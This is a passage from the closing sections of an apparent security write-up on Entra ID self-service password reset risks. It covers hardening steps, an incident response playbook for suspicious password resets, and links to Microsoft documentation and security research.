   # Entra Admin Center → Protection → Conditional Access → New policy
   # Target: "Self-Service Password Reset"
   # Require: "Passwordless sign-in" authentication strength
   ```

### Long-Term Mitigation (1+ months)

1. **Migrate to Authentication Methods Policy:**
   - Phase out legacy SSPR policies
   - Enable unified authentication methods
   - Granular control per method and per action

2. **Implement Passwordless Authentication:**
   - Deploy Windows Hello for Business
   - Enforce FIDO2 for admin accounts
   - Disable SMS globally if possible

3. **Enhanced Monitoring:**
   - Implement real-time SSPR alerts in SIEM
   - Track all password resets with justification
   - Correlate SSPR with subsequent privileged actions

4. **User Education:**
   - Train users NOT to answer security questions publicly
   - Educate on SIM swapping risks
   - Encourage enrollment in strong MFA methods

### Incident Response Playbook

1. **Detection & Initial Response:**
   - SIEM alert → SOC investigates SSPR event
   - Check if password reset is legitimate (contact user's manager)
   - Review what account was reset (admin vs. user)

2. **Containment:**
   - Force password change for affected account
   - Revoke all sessions
   - Review mailbox rules, OAuth consents for persistence

3. **Eradication:**
   - Remove any backdoor accounts created during compromise window
   - Reset MFA devices
   - Audit cloud activity (file access, email forwarding, etc.)

4. **Recovery:**
   - Restore account from backup if available
   - Verify no persistence mechanisms remain
   - Update SSPR configuration to prevent recurrence

5. **Post-Incident:**
   - Conduct forensic analysis of SSPR events (30-day lookback)
   - Check for related attacks (other users reset in same timeframe)
   - Implement additional mitigations if not already done

---

## 13. REFERENCES & FURTHER READING

**Official Microsoft Documentation:**
- [Microsoft Entra SSPR Deployment Guide](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-sspr-deployment)
- [Authentication Methods Policy](https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-authentication-methods-manage)
- [SSPR Troubleshooting](https://learn.microsoft.com/en-us/entra/identity/authentication/active-directory-passwords-troubleshoot)

**Security Research & Cases:**
- [Silverfort: Privilege Escalation in Entra ID](https://www.silverfort.com/blog/privilege-escalation-in-azure-ad/)
- [Coalition: SIM Swapping SSPR Case Study](https://www.coalitioninc.com/blog/security-labs/sim-swapping-extortion)
- [KnowBe4: SSPR Security Risks](https://blog.hypr.com/making-self-service-password-reset-and-account-recovery-secure)

**Detection & Monitoring:**
- [Cloud-Architekt: SSPR Detection Queries](https://www.cloud-architekt.net/azuread-sspr-deployment-and-detection/)
- [Splunk: SSPR Detection Rule](https://research.splunk.com/cloud/)
- [ITPro-Tips: KQL Examples for Entra ID](https://itpro-tips.com/kql-query-examples-for-microsoft-entra-id/)

**Tools:**
- [Atomic Red Team T1098 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)

---